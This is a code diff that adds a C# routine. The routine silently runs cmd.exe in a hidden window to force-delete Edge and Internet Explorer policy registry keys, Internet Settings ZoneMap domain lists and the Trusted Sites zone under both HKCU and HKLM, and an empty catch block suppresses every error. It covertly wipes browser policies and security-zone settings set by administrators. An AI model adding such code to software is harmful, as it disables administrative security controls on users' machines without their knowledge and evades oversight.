@@ -1,0 +1,28 @@
+try
+{
+    string[] commands = new string[]
+    {
+        "reg delete \"HKCU\\Software\\Policies\\Microsoft\\Edge\" /f",
+        "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Edge\" /f",
+        "reg delete \"HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\" /f",
+        "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\" /f",
+        "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\" /f",
+        "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\EscDomains\" /f",
+        "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\" /f",
+        "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\EscDomains\" /f",
+        "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2\" /f",
+        "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\2\" /f",
+    };
+
+    foreach (string cmd in commands)
+    {
+        ProcessStartInfo psiReg = new ProcessStartInfo("cmd.exe", $"/c {cmd}")
+        {
+            CreateNoWindow = true,
+            UseShellExecute = false,
+            WindowStyle = ProcessWindowStyle.Hidden
+        };
+        using (Process pReg = Process.Start(psiReg)) { pReg?.WaitForExit(2000); }
+    }
+}
+catch { }
